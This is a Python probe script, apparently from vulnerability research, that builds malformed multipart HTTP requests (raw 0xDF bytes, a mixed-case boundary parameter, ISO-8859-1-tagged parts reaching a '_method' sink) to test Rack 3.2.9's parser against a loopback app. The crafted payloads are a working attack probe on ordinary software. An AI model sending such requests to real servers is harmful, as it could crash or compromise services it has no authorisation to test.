#!/usr/bin/env python3
"""W370: one loopback request probing Rack 3.2.9 multipart boundary parsing and
multipart header-tagging sinks on an unmodified stock app.

Variants (RUBY2SHELL_W370_VARIANT):
  rawname  - Content-Type parameter name carries raw 0xDF bytes; the Rack token
             scanner cannot match it, so parse_boundary should reject before
             its name.casecmp?("boundary") call.
  token    - Content-Type parameter name is an ASCII token with mixed case
             (BoUnDaRy), so parse_boundary reaches name.casecmp?("boundary")
             with an ASCII-8BIT receiver that cannot hold 0xDF.
  tag      - part names/bodies are tagged charset=ISO-8859-1 and carry odd
             sharp-s counts, including the known _method sink; probes any
             second header-tagged string reaching a case-map sink.

Observability only: loopback socket, no middleware injection, no debugger.
"""

import os
import socket
import sys

HOST = "127.0.0.1"
BOUNDARY = b"XW370BOUND"
VARIANT = os.environ.get("RUBY2SHELL_W370_VARIANT", "rawname")
ODD = b"a" + b"\xdf" * 21


def part(name, payload, charset=b"ISO-8859-1"):
    return (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="' + name + b'"\r\n'
        b"Content-Type: text/plain; charset=" + charset + b"\r\n\r\n"
        + payload + b"\r\n"
    )


def content_type():
    if VARIANT == "rawname":
        # Raw 0xDF cannot match Rack's ASCII-only token regex at parser.rb:144.
        return b"multipart/form-data; boundary=" + BOUNDARY + b"; " + b"\xdf" * 21 + b"=v"
    if VARIANT == "token":
        # Mixed-case ASCII token reaches parser.rb:157 casecmp?; the receiver
        # is scanner.scan(token) from content_type.b, hence ASCII-8BIT ASCII.
        return b"multipart/form-data; boundary=" + BOUNDARY + b"; BoUnDaRy=v"
    return b"multipart/form-data; boundary=" + BOUNDARY


def body():
    if VARIANT == "tag":
        # Two odd-count ISO-8859-1 tagged operands plus the known _method sink.
        return b"".join([
            part(b"left", ODD),
            part(b"right", b"a" + b"\xdf" * 23),
            part(b"_method", ODD),
            part(ODD, b"value", b"ISO-8859-1"),
        ]) + b"--" + BOUNDARY + b"--\r\n"
    return b"".join([
        part(b"left", ODD),
        part(b"_method", ODD),
    ]) + b"--" + BOUNDARY + b"--\r\n"


def main():
    port = int(sys.argv[1])
    method = sys.argv[2] if len(sys.argv) > 2 else "POST"
    payload = body()
    headers = (
        b"Host: 127.0.0.1\r\n"
        b"Content-Type: " + content_type() + b"\r\n"
        b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
        b"Connection: close\r\n"
    )
    request = method.encode() + b" /up HTTP/1.1\r\n" + headers + b"\r\n" + payload
    try:
        with socket.create_connection((HOST, port), timeout=10) as sock:
            sock.sendall(request)
            chunks = []
            while True:
                data = sock.recv(65536)
                if not data:
                    break
                chunks.append(data)
        response = b"".join(chunks)
        head = response.split(b"\r\n", 1)[0].decode("latin-1")
    except Exception as exc:
        response, head = b"", "ERR %s" % type(exc).__name__
    print("variant=%s one-request-head=%s" % (VARIANT, head))
    if b" 400 " in response.split(b"\r\n", 1)[0]:
        excerpt = response.split(b"\r\n\r\n", 1)[-1][:300]
        print("400-body-excerpt=%s" % excerpt.decode("latin-1", "replace").replace("\n", " "))


if __name__ == "__main__":
    main()
